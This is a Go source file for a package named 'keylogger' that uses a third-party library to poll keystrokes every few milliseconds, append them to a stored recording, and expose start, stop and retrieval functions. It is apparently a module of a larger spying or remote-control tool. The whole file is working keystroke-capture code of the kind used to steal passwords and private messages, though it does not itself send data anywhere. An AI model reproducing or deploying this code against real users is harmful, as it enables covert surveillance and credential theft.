package keylogger

import (
	"fmt"
	"github.com/kindlyfire/go-keylogger"
	"time"
)

const (
	delayKeyfetchMS = 5
)

type KeyLoggerInfo struct {
	Recording     string
	StartTime     time.Time
	EndTime       time.Time
	KeyLoggerId   int64
	KeyLoggerOver bool
}

var loggerInfo KeyLoggerInfo

/**
返回Json：键盘记录结果，键盘记录开始时间，键盘记录结束时间
*/
func init() {
	loggerInfo.KeyLoggerOver = true
}
func RunKeyLogger(keyloggerinfo *KeyLoggerInfo) {
	newKeyloggerinfo := keyloggerinfo

	kl := keylogger.NewKeylogger()
	for {
		key := kl.GetKey()
		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			newKeyloggerinfo.Recording = newKeyloggerinfo.Recording + string(key.Rune)
		}
		time.Sleep(delayKeyfetchMS * time.Millisecond)
		if newKeyloggerinfo.KeyLoggerOver {
			break
		}
	}
	newKeyloggerinfo.EndTime = time.Now()
}
func StartKeyLogger() bool {
	if loggerInfo.KeyLoggerOver == false {
		return false
	}
	loggerInfo.Recording = ""
	loggerInfo.KeyLoggerOver = false
	loggerInfo.KeyLoggerId = 001
	loggerInfo.StartTime = time.Now()
	go RunKeyLogger(&loggerInfo)
	return true
}
func EndKeyLogger() bool {
	if loggerInfo.KeyLoggerOver == true {
		return false
	}
	loggerInfo.KeyLoggerOver = true
	loggerInfo.EndTime = time.Now()
	return true
}
func GetKeyRecording() string {
	return loggerInfo.Recording
}
